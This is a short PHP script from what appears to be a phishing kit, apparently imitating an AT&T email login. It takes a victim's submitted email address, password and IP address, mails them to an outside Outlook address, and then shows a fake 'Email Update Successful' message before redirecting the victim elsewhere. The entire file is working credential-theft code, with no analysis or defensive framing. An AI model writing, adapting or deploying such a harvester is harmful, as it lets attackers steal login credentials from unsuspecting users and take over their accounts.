<?

$ip = getenv("REMOTE_ADDR");
$message .= "--Coded by ICE----\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "--------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "----Coded by ICE----------------\n";



$recipient = "boone.sandra@outlook.com";
$subject = "ATT";
$headers = "From: LENXZ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "ATT", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Email Update Successful!!!');
window.location='https://reagan.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>